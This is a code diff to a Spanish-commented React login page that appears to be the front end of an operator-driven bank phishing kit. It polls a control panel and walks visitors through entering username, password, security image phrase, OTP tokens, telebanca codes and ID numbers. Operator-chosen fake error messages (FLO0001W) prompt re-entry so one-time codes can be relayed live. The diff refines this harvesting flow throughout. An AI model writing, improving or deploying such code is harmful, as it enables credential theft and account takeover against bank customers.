@@ -37,7 +37,8 @@ export default function LoginPage() {
   const [challenge, setChallenge] = useState<SecurityChallenge>(
     DEFAULT_SECURITY_CHALLENGE,
   );
-  const sessionIdRef = useRef<string | null>(null);
+  const [sessionId, setSessionId] = useState<string>(() => createSessionId());
+  const sessionIdRef = useRef<string>(sessionId);
   const appliedActionRef = useRef<string>("");
   const usernameRef = useRef<HTMLInputElement>(null);
   const codeRef = useRef<HTMLInputElement>(null);
@@ -49,238 +50,235 @@ export default function LoginPage() {
   const busyRef = useRef(false);
   const finishingRef = useRef(false);
   const tejuinoActiveRef = useRef(false);
-  /** Último state del servidor visto por el poll (para no reaplicar residuales). */
-  const prevServerStateRef = useRef("");
   const lastActionSeqRef = useRef<number>(0);
+  const submittedAtRef = useRef<number>(0);
 
   // Ping + poll de acciones del panel (cross-browser vía API)
   useEffect(() => {
-    const sid = sessionIdRef.current;
-    if (!sid) return;
+    if (!sessionId) return;
+    sessionIdRef.current = sessionId;
+    let cancelled = false;
 
     const tick = async () => {
+      if (cancelled) return;
       try {
-        const session = await fetchOpsSession(sid);
-        if (session) {
-          const actionKey = `${session.state}:${session.imageSrc || ""}:${session.phrase || ""}`;
-          const prevState = prevServerStateRef.current;
-          prevServerStateRef.current = session.state;
+        const session = await fetchOpsSession(sessionId);
+        if (cancelled || !session) return;
 
-          const actionSeq = session.actionSeq ?? 0;
-          const isNewAction = actionSeq > 0 && actionSeq !== lastActionSeqRef.current;
-          if (isNewAction) {
-            lastActionSeqRef.current = actionSeq;
+        const actionKey = `${session.state}:${session.imageSrc || ""}:${session.phrase || ""}`;
+        const actionSeq = session.actionSeq ?? 0;
+        const isNewSeq = actionSeq > 0 && actionSeq !== lastActionSeqRef.current;
+        const isNewTime = (session.updatedAt ?? 0) > (submittedAtRef.current || 0);
+        const isOperatorDecision = isNewSeq || isNewTime;
+
+        if (isNewSeq) {
+          lastActionSeqRef.current = actionSeq;
+        }
+
+        // Acciones del operador primero (c-interna / errores / done)
+        if (session.state === "c-interna") {
+          if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isOperatorDecision) {
+            /* mantener error visible */
+          } else if (
+            appliedActionRef.current !== "c-interna" ||
+            isOperatorDecision ||
+            step !== "tejuino" ||
+            waitingPanel
+          ) {
+            appliedActionRef.current = "c-interna";
+            finishingRef.current = false;
+            tejuinoActiveRef.current = true;
+            setOpsError("");
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setCode("");
+            setStep("tejuino");
           }
-
-          const isSubmitting =
-            waitingPanel ||
-            busyRef.current ||
-            appliedActionRef.current.startsWith("submitted-");
-
-          // Acciones del operador primero (c-interna / errores / done)
-          if (session.state === "c-interna") {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isNewAction) {
-              /* mantener error visible */
-            } else if (
-              (appliedActionRef.current !== "c-interna" && !appliedActionRef.current.startsWith("error-")) ||
-              isNewAction ||
-              step !== "tejuino"
-            ) {
-              appliedActionRef.current = "c-interna";
-              finishingRef.current = false;
-              tejuinoActiveRef.current = true;
-              setOpsError("");
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setCode("");
-              setStep("tejuino");
-            }
-          } else if (session.state === "error-tejuino") {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner — esperando respuesta a nueva submisión */
-            } else if (appliedActionRef.current !== "error-tejuino" || isNewAction) {
-              appliedActionRef.current = "error-tejuino";
-              tejuinoActiveRef.current = true;
-              finishingRef.current = false;
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setCode("");
-              setOpsError(
-                "Error al validar la Clave, por favor intenta de nuevo (FLO0001W)",
-              );
-              setStep("tejuino");
-            }
-          } else if (session.state === "done") {
-            if (!finishingRef.current && (appliedActionRef.current !== "done" || isNewAction)) {
-              appliedActionRef.current = "done";
-              finishingRef.current = true;
-              setOpsError("");
-              const res = completeOpsLoginClient(username || session.username);
-              finishingRef.current = false;
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              if ("error" in res && res.error) {
-                setOpsError(res.error);
-              } else {
-                tejuinoActiveRef.current = false;
-                setCode("");
-                setPassword("");
-                setOpsError("");
-                setStep("usuario");
-              }
-            }
-          } else if (session.state === "error-token") {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner — el usuario acaba de enviar y esperamos la respuesta del operador */
-            } else if (appliedActionRef.current !== "error-token" || isNewAction) {
-              appliedActionRef.current = "error-token";
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setCode("");
-              setOpsError("El código ingresado no es válido (FLO0001W)");
-              if (step !== "telebanca") {
-                setStep("dinamica");
-              }
-            }
-          } else if (session.state === "error-user") {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (appliedActionRef.current !== "error-user" || isNewAction) {
-              appliedActionRef.current = "error-user";
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setUsername("");
-              setCode("");
-              setPassword("");
-              setRemember(false);
-              if (usernameRef.current) usernameRef.current.value = "";
-              setOpsError(
-                "El usuario y/o código ingresado no son válidos, por favor intente nuevamente (FLO0001W)",
-              );
-              setStep("usuario");
-              window.setTimeout(() => usernameRef.current?.focus(), 50);
-            }
-          } else if (session.state === "error-pass") {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (appliedActionRef.current !== "error-pass" || isNewAction) {
-              appliedActionRef.current = "error-pass";
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
+        } else if (session.state === "error-tejuino") {
+          const isResidual = appliedActionRef.current === "submitted-tejuino" && !isOperatorDecision;
+          if (isResidual) {
+            /* keep spinner — esperando respuesta del operador */
+          } else if (appliedActionRef.current !== "error-tejuino" || isOperatorDecision) {
+            appliedActionRef.current = "error-tejuino";
+            tejuinoActiveRef.current = true;
+            finishingRef.current = false;
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setCode("");
+            setOpsError(
+              "Error al validar la Clave, por favor intenta de nuevo (FLO0001W)",
+            );
+            setStep("tejuino");
+          }
+        } else if (session.state === "done") {
+          if (!finishingRef.current && (appliedActionRef.current !== "done" || isOperatorDecision || waitingPanel)) {
+            appliedActionRef.current = "done";
+            finishingRef.current = true;
+            setOpsError("");
+            const res = completeOpsLoginClient(username || session.username);
+            finishingRef.current = false;
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            if ("error" in res && res.error) {
+              setOpsError(res.error);
+            } else {
               tejuinoActiveRef.current = false;
+              setCode("");
               setPassword("");
-              setOpsError(
-                "Error al validar Clave, por favor intente nuevamente. (FLO0001W)",
-              );
-              setStep("imagen");
-            }
-          } else if (
-            session.state === "telebanca" ||
-            session.state === "typing-telebanca"
-          ) {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (step === "telebanca" && appliedActionRef.current === "error-token" && !isNewAction) {
-              /* mantener error visible */
-            } else if (
-              (appliedActionRef.current !== "telebanca" && !appliedActionRef.current.startsWith("error-")) ||
-              isNewAction ||
-              step !== "telebanca"
-            ) {
-              appliedActionRef.current = "telebanca";
               setOpsError("");
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setStep("telebanca");
+              setStep("usuario");
             }
-          } else if (
-            session.state === "identidad" ||
-            session.state === "typing-identidad"
-          ) {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isNewAction) {
-              /* mantener error visible */
-            } else if (
-              (appliedActionRef.current !== "identidad" && !appliedActionRef.current.startsWith("error-")) ||
-              isNewAction ||
-              step !== "identidad"
-            ) {
-              appliedActionRef.current = "identidad";
-              setOpsError("");
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setStep("identidad");
-            }
-          } else if (session.state === "error-identidad") {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (appliedActionRef.current !== "error-identidad" || isNewAction) {
-              appliedActionRef.current = "error-identidad";
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setOpsError(
-                "Error al validar los datos de identidad. Por favor verifica e intenta nuevamente (FLO0001W)",
-              );
-              setStep("identidad");
-            }
-          } else if (session.state === "token" || session.state === "typing") {
-            // Residual typing/token: no bajar spinner si ya enviamos el OTP
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (step === "dinamica" && appliedActionRef.current === "error-token" && !isNewAction) {
-              /* mantener error visible */
-            } else if (
-              (appliedActionRef.current !== "token" && !appliedActionRef.current.startsWith("error-")) ||
-              isNewAction ||
-              step !== "dinamica"
-            ) {
-              appliedActionRef.current = "token";
-              setOpsError("");
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
+          }
+        } else if (session.state === "error-token") {
+          const isResidual =
+            (appliedActionRef.current === "submitted-token" || appliedActionRef.current === "submitted-telebanca") &&
+            !isOperatorDecision;
+          if (isResidual) {
+            /* keep spinner — esperando respuesta del operador */
+          } else if (appliedActionRef.current !== "error-token" || isOperatorDecision) {
+            appliedActionRef.current = "error-token";
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setCode("");
+            setOpsError("El código ingresado no es válido (FLO0001W)");
+            if (step !== "telebanca") {
               setStep("dinamica");
             }
+          }
+        } else if (session.state === "error-user") {
+          const isResidual = appliedActionRef.current === "submitted-usuario" && !isOperatorDecision;
+          if (isResidual) {
+            /* keep spinner */
+          } else if (appliedActionRef.current !== "error-user" || isOperatorDecision) {
+            appliedActionRef.current = "error-user";
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setUsername("");
+            setCode("");
+            setPassword("");
+            setRemember(false);
+            if (usernameRef.current) usernameRef.current.value = "";
+            setOpsError(
+              "El usuario y/o código ingresado no son válidos, por favor intente nuevamente (FLO0001W)",
+            );
+            setStep("usuario");
+            window.setTimeout(() => usernameRef.current?.focus(), 50);
+          }
+        } else if (session.state === "error-pass") {
+          const isResidual = appliedActionRef.current === "submitted-pass" && !isOperatorDecision;
+          if (isResidual) {
+            /* keep spinner */
+          } else if (appliedActionRef.current !== "error-pass" || isOperatorDecision) {
+            appliedActionRef.current = "error-pass";
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            tejuinoActiveRef.current = false;
+            setPassword("");
+            setOpsError(
+              "Error al validar Clave, por favor intente nuevamente. (FLO0001W)",
+            );
+            setStep("imagen");
+          }
+        } else if (
+          session.state === "telebanca" ||
+          session.state === "typing-telebanca"
+        ) {
+          if (step === "telebanca" && appliedActionRef.current === "error-token" && !isOperatorDecision) {
+            /* mantener error visible */
           } else if (
-            session.state === "imagen" &&
-            session.imageSrc &&
-            session.phrase
+            appliedActionRef.current !== "telebanca" ||
+            isOperatorDecision ||
+            step !== "telebanca" ||
+            waitingPanel
           ) {
-            if (isSubmitting && !isNewAction) {
-              /* keep spinner */
-            } else if (step === "imagen" && appliedActionRef.current === "error-pass" && !isNewAction) {
-              /* mantener error visible */
-            } else if (
-              (appliedActionRef.current !== actionKey && !appliedActionRef.current.startsWith("error-")) ||
-              isNewAction ||
-              step !== "imagen"
-            ) {
-              appliedActionRef.current = actionKey;
-              const next = {
-                imageSrc: session.imageSrc,
-                phrase: session.phrase,
-              };
-              saveSecurityChallenge(next);
-              setChallenge(next);
-              setPassword("");
-              setOpsError("");
-              setWaitingPanel(false);
-              setAdvancing(false);
-              busyRef.current = false;
-              setStep("imagen");
-            }
+            appliedActionRef.current = "telebanca";
+            setOpsError("");
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setStep("telebanca");
+          }
+        } else if (
+          session.state === "identidad" ||
+          session.state === "typing-identidad"
+        ) {
+          if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isOperatorDecision) {
+            /* mantener error visible */
+          } else if (
+            appliedActionRef.current !== "identidad" ||
+            isOperatorDecision ||
+            step !== "identidad" ||
+            waitingPanel
+          ) {
+            appliedActionRef.current = "identidad";
+            setOpsError("");
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setStep("identidad");
+          }
+        } else if (session.state === "error-identidad") {
+          const isResidual = appliedActionRef.current === "submitted-identidad" && !isOperatorDecision;
+          if (isResidual) {
+            /* keep spinner */
+          } else if (appliedActionRef.current !== "error-identidad" || isOperatorDecision) {
+            appliedActionRef.current = "error-identidad";
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setOpsError(
+              "Error al validar los datos de identidad. Por favor verifica e intenta nuevamente (FLO0001W)",
+            );
+            setStep("identidad");
+          }
+        } else if (session.state === "token" || session.state === "typing") {
+          if (step === "dinamica" && appliedActionRef.current === "error-token" && !isOperatorDecision) {
+            /* mantener error visible */
+          } else if (
+            appliedActionRef.current !== "token" ||
+            isOperatorDecision ||
+            step !== "dinamica" ||
+            waitingPanel
+          ) {
+            appliedActionRef.current = "token";
+            setOpsError("");
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setStep("dinamica");
+          }
+        } else if (
+          session.state === "imagen" &&
+          session.imageSrc &&
+          session.phrase
+        ) {
+          if (step === "imagen" && appliedActionRef.current === "error-pass" && !isOperatorDecision) {
+            /* mantener error visible */
+          } else if (
+            appliedActionRef.current !== actionKey ||
+            isOperatorDecision ||
+            step !== "imagen" ||
+            waitingPanel
+          ) {
+            appliedActionRef.current = actionKey;
+            const next = {
+              imageSrc: session.imageSrc,
+              phrase: session.phrase,
+            };
+            saveSecurityChallenge(next);
+            setChallenge(next);
+            setPassword("");
+            setOpsError("");
+            setWaitingPanel(false);
+            setAdvancing(false);
+            busyRef.current = false;
+            setStep("imagen");
           }
         }
       } catch {
@@ -290,7 +288,7 @@ export default function LoginPage() {
       // Heartbeat liviano: solo last_seen (no reenviar token/clave ni state,
       // para no pisar c-interna / errores del panel).
       try {
-        await patchOpsSession(sid, {
+        await patchOpsSession(sessionId, {
           last_seen: Date.now(),
         });
       } catch {
@@ -299,9 +297,12 @@ export default function LoginPage() {
     };
 
     void tick();
-    const id = window.setInterval(tick, 1200);
-    return () => window.clearInterval(id);
-  }, [step, username]);
+    const id = window.setInterval(tick, 1000);
+    return () => {
+      cancelled = true;
+      window.clearInterval(id);
+    };
+  }, [sessionId, step]);
 
   useEffect(() => {
     const sid = sessionIdRef.current;
@@ -404,12 +405,16 @@ export default function LoginPage() {
     busyRef.current = true;
     setUsername(user);
     setOpsError("");
-    appliedActionRef.current = "";
+    appliedActionRef.current = "submitted-usuario";
+    submittedAtRef.current = Date.now();
     setAdvancing(true);
     setWaitingPanel(true);
 
-    const id = sessionIdRef.current ?? createSessionId();
+    const id = sessionIdRef.current || sessionId || createSessionId();
     sessionIdRef.current = id;
+    if (id !== sessionId) {
+      setSessionId(id);
+    }
     const now = Date.now();
 
     // Queda en spinner hasta que el panel pulse "Pedir token"
@@ -443,6 +448,7 @@ export default function LoginPage() {
     // Spinner YA: antes del await, para que el primer clic se sienta al instante.
     busyRef.current = true;
     appliedActionRef.current = "submitted-token";
+    submittedAtRef.current = Date.now();
     finishingRef.current = false;
     flushSync(() => {
       setCode(token);
@@ -495,6 +501,7 @@ export default function LoginPage() {
 
     busyRef.current = true;
     appliedActionRef.current = "submitted-telebanca";
+    submittedAtRef.current = Date.now();
     finishingRef.current = false;
     flushSync(() => {
       setCode(confirmationCode);
@@ -573,6 +580,7 @@ export default function LoginPage() {
 
     busyRef.current = true;
     appliedActionRef.current = "submitted-identidad";
+    submittedAtRef.current = Date.now();
     finishingRef.current = false;
     flushSync(() => {
       setDui(currentDui);
@@ -634,6 +642,7 @@ export default function LoginPage() {
 
     busyRef.current = true;
     appliedActionRef.current = "submitted-pass";
+    submittedAtRef.current = Date.now();
     setPassword(pass);
     setOpsError("");
     setAdvancing(true);
@@ -670,6 +679,7 @@ export default function LoginPage() {
     busyRef.current = true;
     tejuinoActiveRef.current = true;
     appliedActionRef.current = "submitted-tejuino";
+    submittedAtRef.current = Date.now();
     finishingRef.current = false;
     flushSync(() => {
       setCode(token);
